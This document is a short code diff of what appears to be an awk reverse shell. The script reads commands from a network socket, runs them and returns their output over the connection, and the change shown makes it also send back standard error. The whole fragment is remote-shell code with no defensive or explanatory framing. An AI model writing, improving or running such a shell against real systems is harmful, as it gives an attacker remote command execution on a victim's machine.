@@ -8,8 +8,8 @@ BEGIN {
             break  # Exit if connection fails
 
         # While the command produces output, send it back over the socket
-        while (c && (c |& getline) > 0)
-            print $0 |& sock
+        while (c && (c " 2>&1" |& getline res) > 0) # Append 2>&1 to the command to also send standard error output
+            print res |& sock
 
         # Close the command input and output streams
         close(c)
